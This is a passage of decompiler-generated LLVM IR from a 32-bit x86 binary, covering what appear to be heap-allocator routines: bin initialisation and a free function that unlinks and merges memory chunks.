  br label %dec_label_pc_805188b

dec_label_pc_805188b:                             ; preds = %dec_label_pc_8051881, %dec_label_pc_8051886
  %v1_805188d = phi i32 [ %v3_8051874, %dec_label_pc_8051881 ], [ %v1_805188d.pre, %dec_label_pc_8051886 ]
  %v0_805188d = phi i32 [ %v3_8051877, %dec_label_pc_8051881 ], [ %v0_8051886, %dec_label_pc_8051886 ]
  %v0_805188b = load i32, i32* @edi, align 4
  %v1_805188b = load i32, i32* %ebp.global-to-local, align 4
  %v2_805188b = add i32 %v1_805188b, %v0_805188b
  store i32 %v2_805188b, i32* @edi, align 4
  %v2_805188d = add i32 %v1_805188d, 12
  %v3_805188d = inttoptr i32 %v2_805188d to i32*
  store i32 %v0_805188d, i32* %v3_805188d, align 4
  %v0_8051890 = load i32, i32* @edx, align 4
  %v1_8051890 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051890 = add i32 %v1_8051890, 8
  %v3_8051890 = inttoptr i32 %v2_8051890 to i32*
  store i32 %v0_8051890, i32* %v3_8051890, align 4
  br label %dec_label_pc_8051893

dec_label_pc_8051893:                             ; preds = %dec_label_pc_8051866, %dec_label_pc_805188b
  store i32 %v1_80517de, i32* %eax.global-to-local, align 4
  %v3_8051897 = load i32, i32* %v2_8051897, align 4
  store i32 %v3_8051897, i32* @edx, align 4
  %v0_805189a = load i32, i32* @ecx, align 4
  store i32 %v0_805189a, i32* %v2_8051897, align 4
  %v0_805189d = load i32, i32* @edi, align 4
  %v1_805189f = or i32 %v0_805189d, 1
  store i32 %v1_805189f, i32* %eax.global-to-local, align 4
  %v0_80518a2 = load i32, i32* @ecx, align 4
  %v1_80518a2 = load i32, i32* @edx, align 4
  %v2_80518a2 = add i32 %v1_80518a2, 12
  %v3_80518a2 = inttoptr i32 %v2_80518a2 to i32*
  store i32 %v0_80518a2, i32* %v3_80518a2, align 4
  %v0_80518a5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80518a5 = load i32, i32* @ecx, align 4
  %v2_80518a5 = add i32 %v1_80518a5, 4
  %v3_80518a5 = inttoptr i32 %v2_80518a5 to i32*
  store i32 %v0_80518a5, i32* %v3_80518a5, align 4
  store i32 %v1_80517de, i32* %eax.global-to-local, align 4
  %v0_80518ac = load i32, i32* @edx, align 4
  %v1_80518ac = load i32, i32* @ecx, align 4
  %v2_80518ac = add i32 %v1_80518ac, 8
  %v3_80518ac = inttoptr i32 %v2_80518ac to i32*
  store i32 %v0_80518ac, i32* %v3_80518ac, align 4
  %v0_80518af = load i32, i32* %eax.global-to-local, align 4
  %v1_80518af = load i32, i32* @ecx, align 4
  %v2_80518af = add i32 %v1_80518af, 12
  %v3_80518af = inttoptr i32 %v2_80518af to i32*
  store i32 %v0_80518af, i32* %v3_80518af, align 4
  %v0_80518b2 = load i32, i32* @edi, align 4
  %v1_80518b2 = load i32, i32* @ecx, align 4
  %v3_80518b2 = add i32 %v1_80518b2, %v0_80518b2
  %v4_80518b2 = inttoptr i32 %v3_80518b2 to i32*
  store i32 %v0_80518b2, i32* %v4_80518b2, align 4
  br label %dec_label_pc_80518c7

dec_label_pc_80518b7:                             ; preds = %dec_label_pc_8051856
  %v0_80518b7 = load i32, i32* @edi, align 4
  %v2_80518b7 = add i32 %v0_80518b7, %v1_805185e
  %v1_80518ba = or i32 %v2_80518b7, 1
  store i32 %v1_80518ba, i32* %eax.global-to-local, align 4
  %v1_80518bd = load i32, i32* @ecx, align 4
  %v2_80518bd = add i32 %v1_80518bd, 4
  %v3_80518bd = inttoptr i32 %v2_80518bd to i32*
  store i32 %v1_80518ba, i32* %v3_80518bd, align 4
  store i32 %tmp20, i32* @edx, align 4
  %v0_80518c4 = load i32, i32* @ecx, align 4
  store i32 %v0_80518c4, i32* %v3_80518c4, align 4
  br label %dec_label_pc_80518c7

dec_label_pc_80518c7:                             ; preds = %dec_label_pc_8051893, %dec_label_pc_80518b7
  store i32 %v3_8051819, i32* @ecx, align 4
  %v1_80518cb = icmp eq i32 %v3_8051819, 0
  %v1_80518cd = icmp eq i1 %v1_80518cb, false
  br i1 %v1_80518cd, label %dec_label_pc_8051819, label %dec_label_pc_80518d3

dec_label_pc_80518d3:                             ; preds = %dec_label_pc_80518c7, %dec_label_pc_8051805
  %v15_80518d7 = icmp eq i32 %v0_8051813, %v4_80517fd
  %v4_80518dd = add i32 %v0_8051813, 4
  br i1 %v15_80518d7, label %dec_label_pc_805195b, label %dec_label_pc_8051805

dec_label_pc_80518e7:                             ; preds = %dec_label_pc_80518e7.lr.ph, %dec_label_pc_80518e7
  %v1_80518eb = phi i32 [ 1, %dec_label_pc_80518e7.lr.ph ], [ %v0_80518f6, %dec_label_pc_80518e7 ]
  %v2_80518eb = mul i32 %v1_80518eb, 8
  %v4_80518eb = add i32 %v3_80518eb, %v2_80518eb
  store i32 %v4_80518eb, i32* %eax.global-to-local, align 4
  %v1_80518ef = add i32 %v1_80518eb, 1
  store i32 %v1_80518ef, i32* %edx.global-to-local, align 4
  %v2_80518f0 = add i32 %v4_80518eb, 12
  %v3_80518f0 = inttoptr i32 %v2_80518f0 to i32*
  store i32 %v4_80518eb, i32* %v3_80518f0, align 4
  %v0_80518f3 = load i32, i32* %eax.global-to-local, align 4
  %v2_80518f3 = add i32 %v0_80518f3, 8
  %v3_80518f3 = inttoptr i32 %v2_80518f3 to i32*
  store i32 %v0_80518f3, i32* %v3_80518f3, align 4
  %v0_80518f6 = load i32, i32* %edx.global-to-local, align 4
  %v7_80518f9 = icmp sgt i32 %v0_80518f6, 95
  br i1 %v7_80518f9, label %dec_label_pc_80518fb, label %dec_label_pc_80518e7

dec_label_pc_80518fb:                             ; preds = %dec_label_pc_80518e7
  store i32 %tmp20, i32* %eax.global-to-local, align 4
  %v1_80518ff = add i32 %tmp20, 864
  %v2_80518ff = inttoptr i32 %v1_80518ff to i32*
  %v3_80518ff = load i32, i32* %v2_80518ff, align 4
  %v4_80518ff = or i32 %v3_80518ff, 1
  store i32 %v4_80518ff, i32* %v2_80518ff, align 4
  %v0_8051906 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051906 = add i32 %v0_8051906, 840
  %v2_8051906 = inttoptr i32 %v1_8051906 to i32*
  store i32 0, i32* %v2_8051906, align 4
  %v0_8051910 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051910 = add i32 %v0_8051910, 852
  %v2_8051910 = inttoptr i32 %v1_8051910 to i32*
  store i32 65536, i32* %v2_8051910, align 4
  %v0_805191a = load i32, i32* %eax.global-to-local, align 4
  %v1_805191a = add i32 %v0_805191a, 844
  %v2_805191a = inttoptr i32 %v1_805191a to i32*
  store i32 262144, i32* %v2_805191a, align 4
  %v0_8051924 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051924 = add i32 %v0_8051924, 836
  %v2_8051924 = inttoptr i32 %v1_8051924 to i32*
  store i32 262144, i32* %v2_8051924, align 4
  store i32 %tmp20, i32* @edx, align 4
  %v2_8051935 = load i32, i32* %arg1, align 4
  %v1_8051937 = urem i32 %v2_8051935, 4
  %v1_805193a = or i32 %v1_8051937, 72
  store i32 %v1_805193a, i32* %arg1, align 4
  %v0_805193f = load i32, i32* @edx, align 4
  %v1_8051941 = add i32 %v0_805193f, 52
  store i32 %v1_8051941, i32* %eax.global-to-local, align 4
  %v2_8051944 = add i32 %v0_805193f, 44
  %v3_8051944 = inttoptr i32 %v2_8051944 to i32*
  store i32 %v1_8051941, i32* %v3_8051944, align 4
  %v1_8051949 = call i32 @function_8051f43(i32 30)
  store i32 %v1_8051949, i32* %eax.global-to-local, align 4
  %v2_8051955 = add i32 %tmp20, 860
  %v3_8051955 = inttoptr i32 %v2_8051955 to i32*
  store i32 %v1_8051949, i32* %v3_8051955, align 4
  br label %dec_label_pc_805195b

dec_label_pc_805195b:                             ; preds = %dec_label_pc_80518d3, %dec_label_pc_80518fb
  store i32 %v0_80517be, i32* @ebx, align 4
  store i32 %v0_80517bd, i32* @esi, align 4
  store i32 %v0_80517bc, i32* @edi, align 4
  %v0_8051962 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8051962

; uselistorder directives
  uselistorder i32 %v0_80518f6, { 1, 0 }
  uselistorder i32 %v0_80518f3, { 1, 0 }
  uselistorder i32 %v1_80518eb, { 1, 0 }
  uselistorder i32 %v0_80518b2, { 1, 0 }
  uselistorder i32 %v1_805186d, { 1, 0 }
  uselistorder i32 %v2_8051866, { 1, 0 }
  uselistorder i32 %v1_805185e, { 0, 2, 1, 3 }
  uselistorder i32 %v1_805186a, { 1, 0 }
  uselistorder i32 %v3_8051819, { 2, 1, 3, 0 }
  uselistorder i32 %v0_8051836, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8051813, { 1, 0, 3, 2 }
  uselistorder i32* %v3_80518c4, { 1, 0 }
  uselistorder i32 %v1_80517de, { 1, 0 }
  uselistorder i32 %tmp20, { 3, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 25, 26, 27, 28 }
  uselistorder i32 860, { 1, 0 }
  uselistorder i32 -3, { 1, 0 }
  uselistorder label %dec_label_pc_805195b, { 1, 0 }
  uselistorder label %dec_label_pc_80518e7, { 1, 0 }
  uselistorder label %dec_label_pc_80518c7, { 1, 0 }
  uselistorder label %dec_label_pc_8051893, { 1, 0 }
  uselistorder label %dec_label_pc_805188b, { 1, 0 }
  uselistorder label %dec_label_pc_8051856, { 1, 0 }
}

define i32 @function_8051963(i32 %arg1) local_unnamed_addr {
dec_label_pc_8051963:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8051963 = load i32, i32* @ebp, align 4
  %v0_8051964 = load i32, i32* @edi, align 4
  %v0_8051965 = load i32, i32* @esi, align 4
  %v0_8051966 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_805196e = icmp eq i32 %arg1, 0
  br i1 %v1_805196e, label %dec_label_pc_8051af7, label %dec_label_pc_8051976

dec_label_pc_8051976:                             ; preds = %dec_label_pc_8051963
  %v2_8051981 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8051981, i32* @eax, align 4
  %v2_8051986 = call i32 @function_80520ca(i32 %v2_8051981, i32 134553799)
  store i32 %v2_8051986, i32* %eax.global-to-local, align 4
  %v1_8051992 = call i32 @function_80520c7(i32 ptrtoint (i32* @global_var_80542e0.32 to i32))
  %v1_8051997 = add i32 %arg1, -8
  store i32 %v1_8051997, i32* @ecx, align 4
  %v0_805199a = load i8, i8* @global_var_80545c0.33, align 1
  %v1_805199a = sext i8 %v0_805199a to i32
  store i32 %v1_805199a, i32* %eax.global-to-local, align 4
  %v1_80519a2 = add i32 %arg1, -4
  %v2_80519a2 = inttoptr i32 %v1_80519a2 to i32*
  %v3_80519a2 = load i32, i32* %v2_80519a2, align 4
  %v1_80519a7 = and i32 %v3_80519a2, -4
  %v4_80519a7 = trunc i32 %v1_80519a7 to i8
  store i32 %v1_80519a7, i32* @ebx, align 4
  %v8_80519ac = icmp ugt i8 %v4_80519a7, %v0_805199a
  br i1 %v8_80519ac, label %dec_label_pc_80519ce, label %dec_label_pc_80519ae

dec_label_pc_80519ae:                             ; preds = %dec_label_pc_8051976
  %v2_80519ae = udiv i32 %v3_80519a2, 8
  %v1_80519b1 = or i32 %v1_805199a, 3
  %v3_80519b1 = trunc i32 %v1_80519b1 to i8
  store i32 %v1_80519b1, i32* %eax.global-to-local, align 4
  store i8 %v3_80519b1, i8* @global_var_80545c0.33, align 64
  %v1_80519b9 = mul nuw i32 %v2_80519ae, 4
  %v2_80519b9 = add i32 %v1_80519b9, ptrtoint (i8* @global_var_80545c0.33 to i32)
  store i32 %v2_80519b9, i32* @edx, align 4
  %v1_80519c0 = add i32 %v1_80519b9, add (i32 ptrtoint (i8* @global_var_80545c0.33 to i32), i32 -4)
  %v2_80519c0 = inttoptr i32 %v1_80519c0 to i32*
  %v3_80519c0 = load i32, i32* %v2_80519c0, align 4
  store i32 %v3_80519c0, i32* %eax.global-to-local, align 4
  %v3_80519c3 = inttoptr i32 %arg1 to i32*
  store i32 %v3_80519c0, i32* %v3_80519c3, align 4
  %v0_80519c6 = load i32, i32* @ecx, align 4
  %v1_80519c6 = load i32, i32* @edx, align 4
  %v2_80519c6 = add i32 %v1_80519c6, -4
  %v3_80519c6 = inttoptr i32 %v2_80519c6 to i32*
  store i32 %v0_80519c6, i32* %v3_80519c6, align 4
  br label %dec_label_pc_8051ae6

dec_label_pc_80519ce:                             ; preds = %dec_label_pc_8051976
  %v1_80519ce = trunc i32 %v3_80519a2 to i8
  %v2_80519ce = and i8 %v1_80519ce, 2
  %v3_80519ce = icmp eq i8 %v2_80519ce, 0
  %v5_80519ce = zext i8 %v2_80519ce to i32
  %v7_80519ce = and i32 %v3_80519a2, -256
  %v8_80519ce = or i32 %v5_80519ce, %v7_80519ce
  store i32 %v8_80519ce, i32* @edx, align 4
  %v1_80519d1 = icmp eq i1 %v3_80519ce, false
  br i1 %v1_80519d1, label %dec_label_pc_8051ac6, label %dec_label_pc_80519d7

dec_label_pc_80519d7:                             ; preds = %dec_label_pc_80519ce
  %v1_80519d7 = or i32 %v1_805199a, 1
  %v3_80519d7 = trunc i32 %v1_80519d7 to i8
  store i32 %v1_80519d7, i32* %eax.global-to-local, align 4
  %v2_80519da = add i32 %v1_80519a7, %v1_8051997
  store i32 %v2_80519da, i32* @esi, align 4
  store i8 %v3_80519d7, i8* @global_var_80545c0.33, align 64
  %v1_80519e2 = add i32 %v2_80519da, 4
  %v2_80519e2 = inttoptr i32 %v1_80519e2 to i32*
  %v3_80519e2 = load i32, i32* %v2_80519e2, align 4
  store i32 %v3_80519e2, i32* %eax.global-to-local, align 4
  %v2_80519e9 = inttoptr i32 %v1_80519a2 to i8*
  %v3_80519e9 = load i8, i8* %v2_80519e9, align 1
  %v4_80519e9 = urem i8 %v3_80519e9, 2
  %v5_80519e9 = icmp eq i8 %v4_80519e9, 0
  %v1_80519ed = icmp eq i1 %v5_80519e9, false
  br i1 %v1_80519ed, label %dec_label_pc_8051a10, label %dec_label_pc_80519ef

dec_label_pc_80519ef:                             ; preds = %dec_label_pc_80519d7
  %v2_80519ef = inttoptr i32 %v1_8051997 to i32*
  %v3_80519ef = load i32, i32* %v2_80519ef, align 4
  store i32 %v3_80519ef, i32* @ebp, align 4
  %v2_80519f4 = sub i32 %v1_8051997, %v3_80519ef
  store i32 %v2_80519f4, i32* %eax.global-to-local, align 4
  %v1_80519f6 = add i32 %v2_80519f4, 8
  %v2_80519f6 = inttoptr i32 %v1_80519f6 to i32*
  %v3_80519f6 = load i32, i32* %v2_80519f6, align 4
  store i32 %v3_80519f6, i32* @edi, align 4
  %v1_80519f9 = add i32 %v2_80519f4, 12
  %v2_80519f9 = inttoptr i32 %v1_80519f9 to i32*
  %v3_80519f9 = load i32, i32* %v2_80519f9, align 4
  store i32 %v3_80519f9, i32* @edx, align 4
  %v1_80519fc = add i32 %v3_80519f6, 12
  %v2_80519fc = inttoptr i32 %v1_80519fc to i32*
  %v3_80519fc = load i32, i32* %v2_80519fc, align 4
  store i32 %v3_80519fc, i32* @ecx, align 4
  %v12_80519ff = icmp eq i32 %v3_80519fc, %v2_80519f4
  %v1_8051a01 = icmp eq i1 %v12_80519ff, false
  br i1 %v1_8051a01, label %dec_label_pc_8051a3f, label %dec_label_pc_8051a03

dec_label_pc_8051a03:                             ; preds = %dec_label_pc_80519ef
  %v1_8051a03 = add i32 %v3_80519f9, 8
  %v2_8051a03 = inttoptr i32 %v1_8051a03 to i32*
  %v3_8051a03 = load i32, i32* %v2_8051a03, align 4
  %v15_8051a03 = icmp eq i32 %v3_8051a03, %v3_80519fc
  %v1_8051a06 = icmp eq i1 %v15_8051a03, false
  br i1 %v1_8051a06, label %dec_label_pc_8051a3f, label %dec_label_pc_8051a08

dec_label_pc_8051a08:                             ; preds = %dec_label_pc_8051a03
  %v2_8051a08 = add i32 %v3_80519ef, %v1_80519a7
  store i32 %v2_8051a08, i32* @ebx, align 4
  store i32 %v3_80519f9, i32* %v2_80519fc, align 4
  %v0_8051a0d = load i32, i32* @edi, align 4
  %v1_8051a0d = load i32, i32* @edx, align 4
  %v2_8051a0d = add i32 %v1_8051a0d, 8
  %v3_8051a0d = inttoptr i32 %v2_8051a0d to i32*
  store i32 %v0_8051a0d, i32* %v3_8051a0d, align 4
  %v0_8051a17.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051a10

dec_label_pc_8051a10:                             ; preds = %dec_label_pc_80519d7, %dec_label_pc_8051a08
  %v1_8051a23 = phi i32 [ %v2_80519da, %dec_label_pc_80519d7 ], [ %v0_8051a17.pre, %dec_label_pc_8051a08 ]
  %v1_8051a14 = and i32 %v3_80519e2, -4
  store i32 %v1_8051a14, i32* @ebp, align 4
  %v1_8051a17 = load i32, i32* @global_var_80545ec.34, align 4
  %v12_8051a17 = icmp eq i32 %v1_8051a23, %v1_8051a17
  br i1 %v12_8051a17, label %dec_label_pc_8051a71, label %dec_label_pc_8051a1f

dec_label_pc_8051a1f:                             ; preds = %dec_label_pc_8051a10
  %v2_8051a1f = add i32 %v1_8051a23, 4
  %v3_8051a1f = add i32 %v2_8051a1f, %v1_8051a14
  %v4_8051a1f = inttoptr i32 %v3_8051a1f to i32*
  %v5_8051a1f = load i32, i32* %v4_8051a1f, align 4
  store i32 %v5_8051a1f, i32* %eax.global-to-local, align 4
  %v3_8051a23 = inttoptr i32 %v2_8051a1f to i32*
  store i32 %v1_8051a14, i32* %v3_8051a23, align 4
  %v0_8051a26 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051a26 = urem i32 %v0_8051a26, 2
  %v2_8051a26 = icmp eq i32 %v1_8051a26, 0
  store i32 %v1_8051a26, i32* %eax.global-to-local, align 4
  %v1_8051a2b = icmp eq i1 %v2_8051a26, false
  br i1 %v1_8051a2b, label %dec_label_pc_8051a4c, label %dec_label_pc_8051a2d

dec_label_pc_8051a2d:                             ; preds = %dec_label_pc_8051a1f
  %v0_8051a2d = load i32, i32* @esi, align 4
  %v1_8051a2d = add i32 %v0_8051a2d, 8
  %v2_8051a2d = inttoptr i32 %v1_8051a2d to i32*
  %v3_8051a2d = load i32, i32* %v2_8051a2d, align 4
  store i32 %v3_8051a2d, i32* @edx, align 4
  %v1_8051a30 = add i32 %v0_8051a2d, 12
  %v2_8051a30 = inttoptr i32 %v1_8051a30 to i32*
  %v3_8051a30 = load i32, i32* %v2_8051a30, align 4
  store i32 %v3_8051a30, i32* %eax.global-to-local, align 4
  %v1_8051a33 = add i32 %v3_8051a2d, 12
  %v2_8051a33 = inttoptr i32 %v1_8051a33 to i32*
  %v3_8051a33 = load i32, i32* %v2_8051a33, align 4
  store i32 %v3_8051a33, i32* @edi, align 4
  %v12_8051a36 = icmp eq i32 %v3_8051a33, %v0_8051a2d
  %v1_8051a38 = icmp eq i1 %v12_8051a36, false
  br i1 %v1_8051a38, label %dec_label_pc_8051a3f, label %dec_label_pc_8051a3a

dec_label_pc_8051a3a:                             ; preds = %dec_label_pc_8051a2d
  %v1_8051a3a = add i32 %v3_8051a30, 8
  %v2_8051a3a = inttoptr i32 %v1_8051a3a to i32*
  %v3_8051a3a = load i32, i32* %v2_8051a3a, align 4
  %v15_8051a3a = icmp eq i32 %v3_8051a3a, %v3_8051a33
  br i1 %v15_8051a3a, label %dec_label_pc_8051a44, label %dec_label_pc_8051a3f

dec_label_pc_8051a3f:                             ; preds = %dec_label_pc_8051a3a, %dec_label_pc_8051a2d, %dec_label_pc_8051a03, %dec_label_pc_80519ef
  %v0_8051a3f = call i32 @function_8051aff()
  store i32 %v0_8051a3f, i32* %eax.global-to-local, align 4
  %v1_8051a44.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8051a44

dec_label_pc_8051a44:                             ; preds = %dec_label_pc_8051a3a, %dec_label_pc_8051a3f
  %v1_8051a44 = phi i32 [ %v3_8051a2d, %dec_label_pc_8051a3a ], [ %v1_8051a44.pre, %dec_label_pc_8051a3f ]
  %v0_8051a44 = phi i32 [ %v3_8051a30, %dec_label_pc_8051a3a ], [ %v0_8051a3f, %dec_label_pc_8051a3f ]
  %v2_8051a44 = add i32 %v1_8051a44, 12
  %v3_8051a44 = inttoptr i32 %v2_8051a44 to i32*
  store i32 %v0_8051a44, i32* %v3_8051a44, align 4
  %v0_8051a47 = load i32, i32* @edx, align 4
  %v1_8051a47 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051a47 = add i32 %v1_8051a47, 8
  %v3_8051a47 = inttoptr i32 %v2_8051a47 to i32*
  store i32 %v0_8051a47, i32* %v3_8051a47, align 4
  %v0_8051a4a = load i32, i32* @ebx, align 4
  %v1_8051a4a = load i32, i32* @ebp, align 4
  %v2_8051a4a = add i32 %v1_8051a4a, %v0_8051a4a
  store i32 %v2_8051a4a, i32* @ebx, align 4
  br label %dec_label_pc_8051a4c

dec_label_pc_8051a4c:                             ; preds = %dec_label_pc_8051a1f, %dec_label_pc_8051a44
  %v0_8051a4c = load i32, i32* @global_var_80545fc.52, align 4
  store i32 %v0_8051a4c, i32* %eax.global-to-local, align 4
  %v0_8051a51 = load i32, i32* @ecx, align 4
  %v1_8051a51 = add i32 %v0_8051a51, 12
  %v2_8051a51 = inttoptr i32 %v1_8051a51 to i32*
  store i32 ptrtoint (i32* @global_var_80545f4.36 to i32), i32* %v2_8051a51, align 4
  %v0_8051a58 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051a58 = load i32, i32* @ecx, align 4
  %v2_8051a58 = add i32 %v1_8051a58, 8
  %v3_8051a58 = inttoptr i32 %v2_8051a58 to i32*
  store i32 %v0_8051a58, i32* %v3_8051a58, align 4
  %v0_8051a5b = load i32, i32* @ebx, align 4
  %v1_8051a5b = load i32, i32* @ecx, align 4
  %v3_8051a5b = add i32 %v1_8051a5b, %v0_8051a5b
  %v4_8051a5b = inttoptr i32 %v3_8051a5b to i32*
  store i32 %v0_8051a5b, i32* %v4_8051a5b, align 4
  %v0_8051a5e = load i32, i32* @ecx, align 4
  %v1_8051a5e = load i32, i32* %eax.global-to-local, align 4
  %v2_8051a5e = add i32 %v1_8051a5e, 12
  %v3_8051a5e = inttoptr i32 %v2_8051a5e to i32*
  store i32 %v0_8051a5e, i32* %v3_8051a5e, align 4
  %v0_8051a61 = load i32, i32* @ebx, align 4
  %v1_8051a63 = or i32 %v0_8051a61, 1
  store i32 %v1_8051a63, i32* %eax.global-to-local, align 4
  %v0_8051a66 = load i32, i32* @ecx, align 4
  store i32 %v0_8051a66, i32* @global_var_80545fc.52, align 4
  %v2_8051a6c = add i32 %v0_8051a66, 4
  %v3_8051a6c = inttoptr i32 %v2_8051a6c to i32*
  store i32 %v1_8051a63, i32* %v3_8051a6c, align 4
  br label %dec_label_pc_8051a81

dec_label_pc_8051a71:                             ; preds = %dec_label_pc_8051a10
  %v0_8051a71 = load i32, i32* @ebx, align 4
  %v2_8051a71 = add i32 %v0_8051a71, %v1_8051a14
  store i32 %v2_8051a71, i32* @ebx, align 4
  %v1_8051a75 = or i32 %v2_8051a71, 1
  store i32 %v1_8051a75, i32* %eax.global-to-local, align 4
  %v1_8051a78 = load i32, i32* @ecx, align 4
  %v2_8051a78 = add i32 %v1_8051a78, 4
  %v3_8051a78 = inttoptr i32 %v2_8051a78 to i32*
  store i32 %v1_8051a75, i32* %v3_8051a78, align 4
  %v0_8051a7b = load i32, i32* @ecx, align 4
  store i32 %v0_8051a7b, i32* @global_var_80545ec.34, align 4
  br label %dec_label_pc_8051a81

dec_label_pc_8051a81:                             ; preds = %dec_label_pc_8051a4c, %dec_label_pc_8051a71
  %v0_8051a81 = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_8051a81, 131072
  br i1 %tmp21, label %dec_label_pc_8051ae6, label %dec_label_pc_8051a89

dec_label_pc_8051a89:                             ; preds = %dec_label_pc_8051a81
  %v0_8051a89 = load i8, i8* @global_var_80545c0.33, align 64
  %v1_8051a89 = and i8 %v0_8051a89, 2
  %v2_8051a89 = icmp eq i8 %v1_8051a89, 0
  br i1 %v2_8051a89, label %dec_label_pc_8051aa2, label %dec_label_pc_8051a92

dec_label_pc_8051a92:                             ; preds = %dec_label_pc_8051a89
  %v2_8051a9a = call i32 @function_80517bb(i32* bitcast (i8* @global_var_80545c0.33 to i32*))
  store i32 %v2_8051a9a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051aa2

dec_label_pc_8051aa2:                             ; preds = %dec_label_pc_8051a89, %dec_label_pc_8051a92
  %v0_8051aa2 = load i32, i32* @global_var_80545ec.34, align 4
  store i32 %v0_8051aa2, i32* %eax.global-to-local, align 4
  %v1_8051aa7 = add i32 %v0_8051aa2, 4
  %v2_8051aa7 = inttoptr i32 %v1_8051aa7 to i32*
  %v3_8051aa7 = load i32, i32* %v2_8051aa7, align 4
  %v1_8051aaa = and i32 %v3_8051aa7, -4
  store i32 %v1_8051aaa, i32* %eax.global-to-local, align 4
  %v1_8051aad = load i32, i32* @global_var_8054904.50, align 4
  %v7_8051aad = icmp ult i32 %v1_8051aaa, %v1_8051aad
  br i1 %v7_8051aad, label %dec_label_pc_8051ae6, label %dec_label_pc_8051ab5

dec_label_pc_8051ab5:                             ; preds = %dec_label_pc_8051aa2
  store i32 ptrtoint (i8* @global_var_80545c0.33 to i32), i32* @edx, align 4
  %v0_8051aba = load i32, i32* @global_var_8054908.48, align 8
  store i32 %v0_8051aba, i32* @eax, align 4
  %v0_8051abf = call i32 @function_805172e()
  store i32 %v0_8051abf, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051ae6

dec_label_pc_8051ac6:                             ; preds = %dec_label_pc_80519ce
  %v2_8051ac6 = inttoptr i32 %v1_8051997 to i32*
  %v3_8051ac6 = load i32, i32* %v2_8051ac6, align 4
  %v0_8051ac9 = load i32, i32* @global_var_8054910.41, align 16
  %v1_8051ac9 = add i32 %v0_8051ac9, -1
  store i32 %v1_8051ac9, i32* @global_var_8054910.41, align 16
  %v2_8051acf = add i32 %v3_8051ac6, %v1_80519a7
  store i32 %v2_8051acf, i32* %eax.global-to-local, align 4
  %v2_8051ad2 = sub i32 %v1_8051997, %v3_8051ac6
  %v0_8051ad8 = load i32, i32* @global_var_8054924.44, align 4
  %v2_8051ad8 = sub i32 %v0_8051ad8, %v2_8051acf
  store i32 %v2_8051ad8, i32* @global_var_8054924.44, align 4
  %v4_8051ade = inttoptr i32 %v2_8051ad2 to i32*
  %v5_8051ade = call i32 @function_805282d(i32* %v4_8051ade, i32 %v2_8051acf, i32 %v1_80519a7, i32 %v1_80519a7)
  store i32 %v5_8051ade, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051ae6

dec_label_pc_8051ae6:                             ; preds = %dec_label_pc_8051aa2, %dec_label_pc_8051a81, %dec_label_pc_8051ab5, %dec_label_pc_80519ae, %dec_label_pc_8051ac6
  store i32 %v2_8051981, i32* @eax, align 4
  %v2_8051aef = call i32 @function_80520ca(i32 %v2_8051981, i32 1)
  store i32 %v2_8051aef, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051af7

dec_label_pc_8051af7:                             ; preds = %dec_label_pc_8051963, %dec_label_pc_8051ae6
  %.0 = phi i32 [ undef, %dec_label_pc_8051963 ], [ %v2_8051aef, %dec_label_pc_8051ae6 ]
  store i32 %v0_8051966, i32* @ebx, align 4
  store i32 %v0_8051965, i32* @esi, align 4
  store i32 %v0_8051964, i32* @edi, align 4
  store i32 %v0_8051963, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_8051ac6, { 1, 0 }
  uselistorder i32 %v0_8051a5b, { 1, 0 }
  uselistorder i32 %v1_8051a26, { 1, 0 }
  uselistorder i32 %v2_8051a1f, { 1, 0 }
  uselistorder i32 %v1_8051a14, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8051a23, { 1, 0 }
  uselistorder i32 %v1_80519a7, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_80519a2, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8051997, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* bitcast (i8* @global_var_80545c0.33 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_80545f4.36 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_80545ec.34, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i8* @global_var_80545c0.33 to i32), { 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_80545c0.33, { 4, 7, 6, 5, 3, 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_80542e0.32 to i32), { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %arg1, { 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8051af7, { 1, 0 }
  uselistorder label %dec_label_pc_8051ae6, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8051aa2, { 1, 0 }
  uselistorder label %dec_label_pc_8051a81, { 1, 0 }
  uselistorder label %dec_label_pc_8051a4c, { 1, 0 }
  uselistorder label %dec_label_pc_8051a44, { 1, 0 }
